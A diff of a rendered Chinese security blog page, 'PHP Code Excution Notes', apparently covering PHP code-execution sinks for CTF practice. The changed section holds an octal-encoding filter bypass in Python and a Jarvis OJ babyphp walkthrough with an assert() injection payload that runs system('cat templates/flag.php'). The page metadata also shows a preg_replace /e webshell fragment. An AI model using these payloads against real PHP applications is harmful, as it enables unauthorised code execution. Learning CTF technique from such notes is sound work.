@@ -26,7 +26,7 @@
 <meta property="og:site_name" content="ZenisLTZ">
 <meta property="og:description" content="0x01 漏洞点 eval()   返回运行结果,可以执行字符串，也可以传入函数名(此时不加分号)   12eval(phpinfo());eval(&quot;phpinfo();&quot;;  assert()   它只能执行一行代码,但可以在动态函数里利用，可以和eval合用  preg_replace()与/e匹配模式   可以构造如下shell 1@preg_replace(&quot;/abc/e&quot;,$_REQU">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-16T08:21:51.297Z">
+<meta property="og:updated_time" content="2019-02-03T19:14:56.450Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP Code Excution Notes">
 <meta name="twitter:description" content="0x01 漏洞点 eval()   返回运行结果,可以执行字符串，也可以传入函数名(此时不加分号)   12eval(phpinfo());eval(&quot;phpinfo();&quot;;  assert()   它只能执行一行代码,但可以在动态函数里利用，可以和eval合用  preg_replace()与/e匹配模式   可以构造如下shell 1@preg_replace(&quot;/abc/e&quot;,$_REQU">
@@ -214,7 +214,7 @@
   <div class="widget">
     <h3 class="widget-title">Tags</h3>
     <div class="widget-body">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a><span class="tag-list-count">3</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a><span class="tag-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -224,7 +224,7 @@
   <div class="widget">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget-body tagcloud">
-      <a href="/tags/PHP/" style="font-size: 13px;">PHP</a> <a href="/tags/php/" style="font-size: 13.5px;">php</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/sqli/" style="font-size: 14px;">sqli</a>
+      <a href="/tags/PHP/" style="font-size: 14px;">PHP</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/sqli/" style="font-size: 13.5px;">sqli</a>
     </div>
   </div>
 
@@ -233,7 +233,7 @@
   <div class="widget">
     <h3 class="widget-title">Archive</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">4</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -481,8 +481,14 @@
 <h3 id="8-数字加"><a href="#8-数字加" class="headerlink" title="8.数字加\"></a>8.数字加\</h3><p>过滤模式:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^<span class="number">0</span><span class="number">-9</span>\\\]</span><br></pre></td></tr></table></figure>
 <p>用八进制字符串</p>
- <figure class="highlight plain"><figcaption><span>```  用八进制表示的字符串</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>def conn(strr):<br>    ans=””<br>    for i in strr:<br>        ans+=”\“+oct(ord(i))[1:]<br>    return ans<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">参考[SUCTF2018 Hateit](http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/)</span><br><span class="line"></span><br><span class="line">## 0x05 Example:</span><br><span class="line"></span><br><span class="line">- Jarvis OJ	babyphp   assert</span><br><span class="line"></span><br><span class="line">index.php:</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"> &lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">    $page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">    require_once $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p> <code>\[0-7]{1,3}</code>  用八进制表示的字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def conn(strr):</span><br><span class="line">    ans=&quot;&quot;</span><br><span class="line">    for i in strr:</span><br><span class="line">        ans+=&quot;\\&quot;+oct(ord(i))[1:]</span><br><span class="line">    return ans</span><br></pre></td></tr></table></figure>
+<p>参考<a href="http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">SUCTF2018 Hateit</a></p>
+<h2 id="0x05-Example"><a href="#0x05-Example" class="headerlink" title="0x05 Example:"></a>0x05 Example:</h2><ul>
+<li>Jarvis OJ    babyphp   assert</li>
+</ul>
+<p>index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注入$file参数闭合单引号</span><br><span class="line">$file = &quot;templates/flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos;.php   </span><br><span class="line"></span><br><span class="line">那assert函数执行时就变成   </span><br><span class="line">assert(&quot;strpos(&apos;templates/flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos;.php&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br></pre></td></tr></table></figure>
 <p>payload:  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos;</span><br></pre></td></tr></table></figure>
@@ -554,6 +560,10 @@
       <a href="/2018/10/10/PySandox/" title="Python沙箱"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
     </li>
     
+    
+    <li class="next">
+      <a href="/2018/01/27/File_inclusion/" title="PHP 文件包含与文件读取"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
     
     
   </ul>
